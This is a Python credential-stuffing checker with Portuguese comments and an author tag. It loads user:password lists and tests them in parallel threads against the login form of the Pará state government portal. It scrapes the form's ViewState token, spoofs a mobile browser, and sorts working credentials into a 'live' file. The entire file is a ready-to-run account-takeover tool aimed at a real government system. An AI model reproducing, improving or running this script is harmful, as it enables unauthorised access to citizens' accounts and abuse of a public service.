import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)

# Configurações
MAX_THREADS = 15
TIMEOUT = 25
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
ERROR_FILE = "errors.txt"
LOGINS_FILE = "logins.txt"

stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def show_panel():
    elapsed = time.time() - stats['start_time']
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "        BY CALUSH N V P")
    print(Fore.CYAN + "══════════════════════════════════")
    print(f"{Fore.GREEN}✅ LIVE: {stats['live']}")
    print(f"{Fore.RED}❌ DIE: {stats['die']}")
    print(f"{Fore.YELLOW}⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + "══════════════════════════════════")
    print(f"{Fore.WHITE}TOTAL: {stats['total']}")
    print(f"TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def save_result(filename, content):
    with open(filename, 'a') as f:
        f.write(content + '\n')

def check_login(user, senha):
    try:
        url = 'https://www.sistemas.pa.gov.br/governodigital/public/main/index.xhtml'
        
        with requests.Session() as s:
            # Primeira requisição para pegar o ViewState
            r1 = s.get(url, timeout=TIMEOUT)
            soup = BeautifulSoup(r1.text, 'html.parser')
            viewstate = soup.find('input', {'name': 'javax.faces.ViewState'})['value']

            # Dados do POST
            data = {
                'form_login': 'form_login',
                'form_login:login_username': user,
                'form_login:login_password': senha,
                'javax.faces.ViewState': viewstate,
                'form_login:button_login': 'form_login:button_login',
                'nocid': 'true'
            }

            # Headers
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
                'Referer': url,
                'Origin': 'https://www.sistemas.pa.gov.br'
            }

            # Envia o login
            r2 = s.post(url, data=data, headers=headers, timeout=TIMEOUT)
            
            # Verifica se login foi bem-sucedido
            if 'Dados incorretos.' in r2.text:
                return "DIE", user, senha
            else:
                return "LIVE", user, senha

    except Exception as e:
        return "ERROR", user, senha, str(e)

def main():
    # Verifica se o arquivo existe
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    # Carrega os logins
    with open(LOGINS_FILE, 'r') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line.strip()]
    
    stats['total'] = len(accounts)
    show_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            user, senha = acc[0], acc[1]
            futures.append(executor.submit(check_login, user, senha))

        for future in as_completed(futures):
            result = future.result()
            status = result[0]

            if status == "LIVE":
                stats['live'] += 1
                save_result(LIVE_FILE, f"{result[1]}:{result[2]}")
                print(f"{Fore.GREEN}[+] LIVE | {result[1]}:{result[2]}")
            elif status == "DIE":
                stats['die'] += 1
                save_result(DIE_FILE, f"{result[1]}:{result[2]}")
                print(f"{Fore.RED}[-] DIE | {result[1]}:{result[2]}")
            else:
                stats['error'] += 1
                save_result(ERROR_FILE, f"{result[1]}:{result[2]} | {result[3]}")
                print(f"{Fore.YELLOW}[!] ERROR | {result[1]}:{result[2]}")

            show_panel()

    print(Fore.GREEN + "\nVerificação concluída!")

if __name__ == "__main__":
    main()